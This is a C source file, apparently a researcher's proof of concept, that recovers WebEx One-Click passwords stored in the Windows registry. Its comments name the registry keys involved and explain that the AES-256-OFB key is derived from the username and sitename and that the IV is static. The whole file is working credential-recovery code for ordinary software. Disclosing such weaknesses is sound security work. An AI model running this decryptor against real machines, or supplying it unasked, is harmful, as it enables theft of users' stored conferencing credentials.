
/*
    WebEx One-Click Registry Key Decryptor
        brad.antoniewicz@foundstone.coma

    compile with gcc -o webex-onedecrypt -lssl webex-onedecrypt.c

    Thanks to https://code.google.com/p/tps-cripto-itba/source/browse/trunk/src/criptography
    for making life easy

    see comments below

*/

#include <openssl/aes.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

unsigned char *
aes_ofb_encrypt(unsigned char * text, int length, unsigned char * key, unsigned char * iv)
{
        unsigned char * outbuf = calloc(1,length);
        int num = 0;

        unsigned char liv[16];

        memcpy(liv,iv,16);

        AES_KEY aeskey;

        //memset(outbuf, 0, 8);

        AES_set_encrypt_key(key, 256, &aeskey);

        AES_ofb128_encrypt(text, outbuf, length, &aeskey, liv, &num);

        return outbuf;
}

unsigned char *
aes_ofb_decrypt(unsigned char * enc, int length, unsigned char * key, unsigned char * iv)
{
        unsigned char * outbuf= calloc(1,length);
        int num = 0;

        unsigned char liv[16];

        memcpy(liv,iv,16);

        AES_KEY aeskey;


        AES_set_encrypt_key(key, 256, &aeskey);

        AES_ofb128_encrypt(enc, outbuf, length, &aeskey, liv, &num);

        return outbuf;
}
void main() {
    /*
        This value is from 
            HKEY_CURRENT_USER\Software\WebEx\ProdTools\Password
    */
    unsigned char * regVal = "\xcc\x6d\xc9\x3b\xa0\xcc\x4c\x76\x55\xc9\x3b\x9f";
    /*
        This value is from 
            HKEY_CURRENT_USER\Software\WebEx\ProdTools\PasswordLen
    */
    int regLength = 12; 

    /*
        This value is a combination of these two registry keys:
            HKEY_CURRENT_USER\Software\WebEx\ProdTools\UserName
            HKEY_CURRENT_USER\Software\WebEx\ProdTools\SiteName

        Basicaly the username and the sitename padding to 32 characters, if the 
        two dont add up to 32 characters, its just repeated until it fits 
    */
    unsigned char key[32] = "braantonsiteaa.webex.com/siteaab"; 

    /*
        The IV is static, particularly complex value of 123456789abcdef....
    */
    unsigned char iv[16] = { 0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, 0xde, 0xf0, 0x34, 0x56, 0x78, 0x9a, 0xbc, 0xde, 0xf0, 0x12 };

    /* 
        These are just for testing, you'd probably not have the password :)
    */
    unsigned char * password = "bradbradbrad";
    int pwLength = strlen((char *)password);

    unsigned char * enc = NULL;
    unsigned char * enc2 = NULL;
    int i = 0;

    
    printf("Reg Key Value = ");
    enc = aes_ofb_encrypt(password, pwLength, key, iv);
    for(i=0;i<pwLength;i++) {
        printf("%02x ", enc[i]);
    }
    printf("\n");

    printf("Password = ");
    enc2 = aes_ofb_decrypt(regVal, regLength, key, iv);
    for(i=0;i<regLength;i++) {
        printf("%c", enc2[i]);
    }
    printf("\n");    
   

}
